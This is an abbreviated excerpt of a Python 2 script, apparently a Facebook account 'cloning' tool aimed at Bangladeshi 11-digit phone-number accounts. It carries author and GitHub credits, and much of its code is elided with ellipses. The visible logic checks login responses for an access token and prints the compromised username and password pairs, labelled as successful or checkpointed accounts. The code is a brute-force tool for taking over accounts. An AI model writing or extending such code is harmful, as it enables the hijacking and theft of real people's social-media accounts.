...
psb('\x1b[1;32mBANGLADESH IMTIAZ 11 DIGIT CLONING START PLEASE WAIT ..........')
...
def menu():
    ...
    print 'AUTHOR   : IMTIAZ 420'

    print 'FACEBOOK : IMTIAZ KHAN M.M.M'

    print 'GITHUB     : github.com/IMTIAZ420'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[IMTIAZ-OKY]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                ...
                print '\x1b[1;93m[IMTIAZ-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 03 Days]\x1b[0m \n'
